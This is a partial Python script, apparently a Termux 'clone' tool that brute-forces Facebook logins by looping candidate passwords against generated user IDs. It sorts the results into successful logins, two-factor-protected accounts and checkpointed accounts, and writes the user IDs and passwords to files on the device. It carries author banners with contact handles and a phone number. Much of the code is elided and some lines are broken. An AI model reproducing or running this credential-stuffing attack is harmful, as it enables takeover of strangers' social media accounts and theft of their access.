#created by Alamin Vau
#team name Skb
#tottaly written by Md. Alamin Islam
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
SKB = '{ SKB }'
now = datetime.now()
dt_string = now.strftime("%A:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
Alamin2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
{BLUE}=  ====  ==      ====  =======
==============================
\033[1;37m╔Ⓢ︎Ⓚ︎Ⓑ︎═════════════════\033[1;33m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m══════════════ⒽⒷⒻ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝐌𝐃. 𝐀𝐋𝐀𝐌𝐈𝐍 𝐈𝐒𝐋𝐀𝐌     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝐒𝐈𝐋𝐄𝐍𝐓 𝐊𝐈𝐋𝐋𝐄𝐑𝐒 𝐁𝐎𝐘𝐒 𝐓𝐄𝐀𝐌\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐀𝐋𝐀𝐌𝐈𝐍-𝐗𝐃89            \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+8801915935712             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m𝐋𝐄𝐀𝐑𝐍𝐈𝐍𝐆 𝐓𝐄𝐑𝐌𝐔𝐗            \033[1;31m   │
\033[1;37m╚ⒽⒷⒻFACEBOOK TRICKS AND HELPING ZONE{ 𝐒𝐊𝐁}\033[1;37mⓈ︎Ⓚ︎Ⓑ︎╝
\033[1;91m==========================================================
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mSKB-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mSKB-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : Md. Alamin Islam")
    print("\t  Fb page  : Skb Team Command")
    print("\t  Github   : ALAMIN-XD89")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=SKB"
        print("\n\t     [ Hello User ]\n")
        ...
        print(" otherwise msg on this whatsapp 01915935712\n")
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_ALAMIN_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/Termux.User.Tera.Next.Pappa");xyz()
    elif hamii in ["4","04"]:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio Alamin_OK.mp3")
                print('\r\033[1;32m[SKB-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio ALAMIN_2F.mp3")
                    print('\r\033[1;34m[SKB-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/ALAMIN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio ALAMIN_CP.mp3")
                    print(f'\r\033[1;30m[SKB-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALAMIN🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
